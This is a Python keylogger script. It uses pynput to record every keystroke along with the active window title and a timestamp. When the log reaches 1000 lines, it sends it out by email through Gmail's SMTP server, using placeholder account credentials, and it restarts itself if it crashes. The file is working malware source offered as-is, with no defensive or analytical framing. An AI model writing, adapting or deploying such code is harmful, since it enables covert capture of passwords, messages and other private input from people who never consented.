# Importing libs
from pynput import keyboard
from datetime import date, datetime
from smtplib import SMTP_SSL
from pyautogui import getActiveWindowTitle
from sys import setrecursionlimit

# Function to check if it's time to send the log

log = ''

def check():
    global log
    nlines = log.count('\n')
    if nlines >= 1000:
        today = str(date.today())
        email_text = 'Subject: Your e-mail subject' + today + '\n\n'
        email_text += log
        email_text = email_text.encode('utf-8')

        connection = SMTP_SSL('smtp.gmail.com', 465)
        connection.login('xxxxxxxxxx@gmail.com', 'xxxx xxxx xxxx xxxx') # Your email and Google App passwords created password
        connection.sendmail('', 'xxxxxxxxxx@gmail.com', email_text)     # Your email again
        connection.quit()
        log = ''

# Function to put the date and name of the active window in the log
def info():
    global log
    current_time = datetime.now()
    current_time_hour = str(current_time.hour)
    current_time_minute = str(current_time.minute)
    current_time_second = str(current_time.second)
    try:
        window_name = getActiveWindowTitle()
    except AttributeError:
        return False
    log += "\n" +  current_time_hour + ":" + current_time_minute + ":" + current_time_second + " | " + window_name + ": "

# Function that listens to what the user types and adds to the log
def press(key):
    global log
    try:
        if key == keyboard.Key.esc:
            info()
            log += "<esc>"
            check()
        elif key == keyboard.Key.cmd_l or key == keyboard.Key.cmd_r:
            info()
            log += "<win>"
            check()
        elif key == keyboard.Key.delete:
            info()
            log += "<delete>"
            check()
        elif key == keyboard.Key.space:
            info()
            log += "<space>"
            check()
        elif key == keyboard.Key.backspace:
            info()
            log += "<backspace>"
            check()
        elif key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
            info()
            log += "<shift>"
            check()
        elif key == keyboard.Key.enter:
            info()
            log += "<enter>"
            check()
        elif key == keyboard.Key.tab:
            info()
            log += "<tab>"
            check()
        elif key == keyboard.Key.alt_gr or key == keyboard.Key.alt_l or key == keyboard.Key.alt_r or key == keyboard.Key:
            info()
            log += "<alt>"
            check()
        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r or key == keyboard.Key.ctrl:
            info()
            log += "<ctrl>"
            check()
        elif key == keyboard.Key.caps_lock:
            info()
            log += "<caps_lock>"
            check()
        elif key == keyboard.Key.left:
            info()
            log +="<left_arrow>"
            check()
        elif key == keyboard.Key.right:
            info()
            log += "<right_arrow>"
            check()
        else:
            info()
            log += (f"" + "<{0}>".format(
                    key.char))
            check()
    except AttributeError:
        log += ''
        check()

# Start the listener, if it stops working while listening, will be restarted
setrecursionlimit(10000)

def start():
    try:
        with keyboard.Listener(on_press=press) as listener:
            listener.join()
    except Exception:
        start()

start()
